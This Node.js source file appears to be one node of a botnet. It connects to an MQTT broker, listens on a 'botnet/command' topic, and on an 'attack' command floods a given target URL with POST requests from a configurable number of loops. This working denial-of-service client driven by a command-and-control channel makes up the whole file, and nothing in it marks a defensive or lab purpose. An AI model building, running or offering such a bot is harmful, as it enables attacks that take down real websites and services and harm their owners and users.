const express = require('express');
const mqtt = require('mqtt');
const axios = require('axios');

const app = express();
app.use(express.json());

// MQTT Configuration
const MQTT_BROKER_HOST = process.env.MQTT_BROKER_HOST || 'localhost';
const MQTT_PORT = process.env.MQTT_PORT || 1883;
const COMMAND_TOPIC = 'botnet/command';

const mqttClient = mqtt.connect(`mqtt://${MQTT_BROKER_HOST}:${MQTT_PORT}`);

mqttClient.on('connect', () => {
  console.log(`Connected to MQTT Broker at ${MQTT_BROKER_HOST}:${MQTT_PORT}`);
  mqttClient.subscribe(COMMAND_TOPIC, () => {
    console.log(`Subscribed to topic: ${COMMAND_TOPIC}`);
  });
});

mqttClient.on('message', async (topic, message) => {
  if (topic === COMMAND_TOPIC) {
    const command = JSON.parse(message.toString());
    if (command.action === 'attack') {
      console.log(`Received attack command. Target: ${command.target}`);
      // Trigger DDoS attack
      await performDDoS(command.target,command.number_thread,command.loop_count);
    }
  }
});

async function performDDoS(targetUrl, number_thread, loop_count) {
  console.log(`Starting DDoS attack on ${targetUrl} with ${number_thread} threads and ${loop_count} requests per thread.`);

  let totalRequests = 0;
const threads = []

  for (let i = 0; i < number_thread; i++) {
    const threadId = i + 1;

    console.log(`Thread ${threadId} started.`);

    const promisse = new Promise((resovle) => {
        for (let index = 0; index < loop_count; index++) {
            console.log(`Thread ${threadId}: Request ${index} sent to ${targetUrl}`);
            axios.post(targetUrl).then((data) => {
            }).catch((err) => {

            })
            totalRequests++; // Tăng số lượng request đã gửi đi
        }
        resovle(true)
         // Send request every 100ms
    })
    threads.push(promisse)
  }
    await Promise.all(threads);
    console.log("Total Number Request send:",totalRequests)
}


// Start the Express server
const PORT = 3001;
app.listen(PORT, () => {
  console.log(`Node 2 device running on http://localhost:${PORT}`);
});
